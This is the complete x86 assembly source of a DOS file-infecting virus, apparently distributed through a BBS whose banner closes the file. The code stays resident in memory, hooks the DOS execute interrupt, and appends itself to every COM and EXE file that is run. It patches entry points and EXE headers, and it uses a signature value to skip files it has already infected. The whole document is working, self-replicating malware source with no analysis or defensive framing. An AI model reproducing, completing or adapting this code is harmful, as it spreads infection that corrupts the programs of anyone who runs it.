virus segment public 'code'
	assume	cs:virus,ds:virus,es:virus
	org	0

VirusSize	equ	VirusEnd-$

Com:	call	Begin
	call	Label2

PartPage	equ	this word+02h
PageCount	equ	this word+04h
HdrSize		equ	this word+08h
MinMem		equ	this word+0ah
MaxMem		equ	this word+0ch
ExeSS		equ	this word+0eh
ExeSP		equ	this word+10h
ExeSignature	equ	this word+12h
ExeStart	equ	this dword+14h
ExeIP		equ	this word+14h
ExeCS		equ	this word+16h

SavedCode:
	mov	ax,4c00h
	int	21h

	org	SavedCode+18h

Label2:	pop	si
	mov	di,100h
	push	di
	movsw
	movsw
	movsb
	ret

Exe:	call	Begin
	mov	dx,ds
	add	dx,10h
	add	cs:ExeCS,dx
	add	dx,cs:ExeSS
	mov	ss,dx
	mov	sp,cs:ExeSP
	jmp	cs:ExeStart

Begin:	push	ds
	push	es
	push	ax
	xor	ax,ax
	mov	ds,ax
	mov	ds,ds:[46ah]
	cmp	Signature,0ACDCh
	je	Exit
	mov	ah,4ah
	mov	bx,-1
	int	21h
	sub	bx,(VirusSize+1fh)/10h+1000h
	jb	Exit
	add	bh,10h
	mov	ah,4ah
	int	21h
	mov	ah,48h
	mov	bx,(VirusSize+0fh)/10h
	int	21h
	jb	Exit
	dec	ax
	mov	es,ax
	inc	ax
	mov	es:[1],ax
	mov	es,ax
	push	cs
	pop	ds
	call	Label1
Label1:	pop	si
	sub	si,offset Label1
	xor	di,di
	push	di
	mov	cx,VirusSize
	rep	movsb
	pop	ds
	mov	ax,ds:[84h]
	mov	word ptr es:OldInt21[0],ax
	mov	ax,ds:[86h]
	mov	word ptr es:OldInt21[2],ax
	mov	byte ptr ds:[467h],0eah
	mov	word ptr ds:[468h],offset NewInt21
	mov	ds:[46ah],es
	mov	word ptr ds:[84h],7
	mov	word ptr ds:[86h],46h
Exit:	pop	ax
	pop	ds
	pop	es
	ret

Header		db	0e9h
		dw	0
Signature	dw	0ACDCh

NewInt21:
	cmp	ah,4bh
	je	Exec
	jmp	short EOI
Exec:	push	ax
	push	bx
	push	cx
	push	dx
	push	ds
	mov	ax,3d02h
	call	Interrupt
        jc      short Error
	push	cs
	pop	ds
	mov	bx,ax
	mov	ah,3fh
	mov	cx,18h
	mov	dx,offset SavedCode
	call	DOS
	cmp	word ptr cs:SavedCode,5a4dh
	je	ExeFile
ComFile:cmp	word ptr cs:SavedCode[3],0ACDCh
        je      short Close
	mov	al,02h
	call	Seek
	or	dx,dx
;       jmp     short Close
	cmp	ah,0f6h
        je      short Close
	sub	ax,5
;       jmp     short Close
	inc	ax
	inc	ax
	mov	word ptr ds:Header[1],ax
	mov	ah,40h
	mov	cx,VirusSize
	xor	dx,dx
	call	DOS
	mov	al,00h
	call	Seek
	mov	ah,40h
	mov	cx,5
	mov	dx,offset Header
	call	Interrupt
Close:	mov	ah,3eh
	call	Interrupt
Error:	pop	ds
	pop	dx
	pop	cx
	pop	bx
	pop	ax

EOI:		db	0eah		; jmp	0:0
OldInt21	dd	026b1465h

ExeFile:cmp	ExeSignature,0ACDCh
        je      short Close
	mov	al,02h
	call	Seek
	add	ax,0fh
	adc	dx,0
	and	al,0f0h
	xchg	ax,dx
	mov	cx,ax
	mov	ax,4200h
	call	DOS
	mov	cx,10h
	div	cx
	or	dx,dx
	jne	Close
	mov	dx,ax
	sub	dx,HdrSize
	push	dx
	mov	cx,10h
	mul	cx
	add	ax,VirusSize
	adc	dx,0
	mov	cx,200h
	div	cx
	inc	ax
	push	ax
	push	dx
	mov	ah,40h
	mov	cx,VirusSize
	xor	dx,dx
	call	Interrupt
	pop	PartPage
	pop	PageCount
	pop	ax
	jc	Close
	mov	ExeCS,ax
	mov	ExeIP,offset Exe
	add	ax,(VirusSize+0fh)/10h
	mov	ExeSS,ax
	mov	ExeSP,200h
	cmp	MinMem,20h
	jae	Mem1
	mov	MinMem,20h
Mem1:	cmp	MaxMem,20h
	jae	Mem2
	mov	MaxMem,20h
Mem2:	mov	al,00
	call	Seek
	mov	ah,40h
	mov	cx,18h
	mov	dx,offset SavedCode
	call	Interrupt
	jmp	Close

Seek:	mov	ah,42h
	xor	cx,cx
	xor	dx,dx

DOS:	call	Interrupt
	jnc	Ok
	pop	ax
	jmp	Close

Interrupt:
	pushf
	call	cs:OldInt21
Ok:	ret

VirusEnd	equ	$

virus ends

end

;  컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
;  컴컴컴컴컴컴컴컴컴컴> and Remember Don't Forget to Call <컴컴컴컴컴컴컴컴
;  컴컴컴컴컴컴> ARRESTED DEVELOPMENT +31.79.426o79 H/P/A/V/AV/? <컴컴컴컴컴
;  컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
